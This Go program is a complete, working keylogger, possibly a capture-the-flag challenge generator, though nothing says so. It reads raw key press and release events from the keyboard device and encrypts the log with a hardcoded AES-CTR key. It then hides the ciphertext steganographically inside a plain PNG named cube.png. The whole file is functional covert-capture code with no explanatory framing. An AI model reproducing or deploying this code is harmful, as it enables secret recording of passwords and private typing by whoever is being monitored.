package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"image"
	"image/color"
	"image/draw"
	"os"
	"os/signal"
	"syscall"

	"github.com/MarinX/keylogger"
	"github.com/auyer/steganography"
)

func main() {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) <= 0 {
		fmt.Println("no keyboard found")
		return
	}

	k, err := keylogger.New(keyboard)
	if err != nil {
		fmt.Printf("error occured on init: %v\n", err)
		return
	}
	defer k.Close()

	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	c := []uint8{0, 0, 0}
	i := 0
	b := new(bytes.Buffer)
	var o byte
loop:
	for e := range k.Read() {
		select {
		case <-sigs:
			break loop
		default:
			switch e.Type {
			case keylogger.EvKey:
				if e.KeyPress() {
					o = 0x70
				}
				if e.KeyRelease() {
					o = 0x72
				}
				if o == 0x00 {
					continue
				}
				b.WriteByte(o)
				b.WriteByte(byte(e.Code >> 8))
				b.WriteByte(byte(e.Code & 0xff))
				c[i%3] = uint8(e.Code & 0xff)
				i++
			}
		}
	}

	content := b.Bytes()
	block, err := aes.NewCipher([]byte("mce3Ej10xk3Aqw19"))
	if err != nil {
		fmt.Printf("failed to init cipher: %v\n", err)
		return
	}

	ciphertext := make([]byte, len(content))
	mode := cipher.NewCTR(block, []byte("kdE39vn1S0EE3kcm"))
	mode.XORKeyStream(ciphertext, content)
	b.Reset()

	img := image.NewRGBA(image.Rect(0, 0, 640, 480))
	col := color.RGBA{c[0], c[1], c[2], 255}
	draw.Draw(img, img.Bounds(), &image.Uniform{col}, image.ZP, draw.Src)
	if err := steganography.Encode(b, img, ciphertext); err != nil {
		fmt.Printf("failed to encode to image: %v\n", err)
		return
	}

	f, err := os.Create("./cube.png")
	if err != nil {
		fmt.Printf("error on img: %v\n", err)
		return
	}
	defer f.Close()
	b.WriteTo(f)
}
